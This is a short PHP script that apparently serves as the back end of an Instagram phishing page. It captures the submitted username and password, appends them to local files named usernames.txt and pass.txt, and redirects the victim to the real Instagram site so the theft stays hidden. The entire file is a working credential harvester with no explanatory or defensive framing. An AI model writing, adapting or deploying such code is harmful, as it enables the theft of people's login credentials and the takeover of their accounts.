<?php

file_put_contents("usernames.txt", "Instagram Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Instagram Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/');
?>
